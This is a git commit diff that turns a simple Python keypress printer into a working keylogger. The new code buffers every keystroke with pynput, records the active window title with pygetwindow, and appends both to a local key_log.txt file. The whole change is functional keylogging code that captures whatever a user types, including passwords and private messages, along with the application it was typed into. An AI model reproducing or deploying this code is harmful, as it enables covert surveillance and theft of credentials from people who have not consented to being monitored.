f4c2aa1f3ff485bed4a4403f20638ad271b10b59
Ervin-Capuno <ervinreycapuno23@gmail.com>
2024-07-29 17:10:19 +0800

    Added a text file where the storing of keystores will take place

--- project/main.py
+++ project/main.py
@@ -1,16 +1,43 @@
+import pygetwindow as gw
 from pynput import keyboard
+import time
+log_file = 'key_log.txt'
+last_press_time = time.time()
+buffer = []
 
 def on_press(key):
+    global last_press_time, buffer
+    current_time = time.time()
+    
+    # Check if 5 seconds have passed since the last key press
+    if current_time - last_press_time > 5:
+        # Write buffer to the file and start a new line
+        with open(log_file, 'a') as f:
+            if buffer:
+                f.write(''.join(buffer) + '\n')
+        buffer = []
+    
+    window = gw.getActiveWindow()
+    window_title = window.title if window else 'No active window'
+    
+    # Log the active window title only if the buffer is empty (start of a new line)
+    if not buffer:
+        with open(log_file, 'a') as f:
+            f.write(f'Window: {window_title} | ')
+    
+    # Append the key pressed to the buffer
     try:
-        print('{0}'.format(key.char))
+        buffer.append(key.char)
     except AttributeError:
-        print('{0}'.format(key))
+        buffer.append(f'[{key}]')
+    
+    last_press_time = current_time
 
 def on_release(key):
     if key == keyboard.Key.esc:
         return False
 
-
 listener = keyboard.Listener(on_press = on_press, on_release = on_release)
 listener.start()
+
 listener.join()
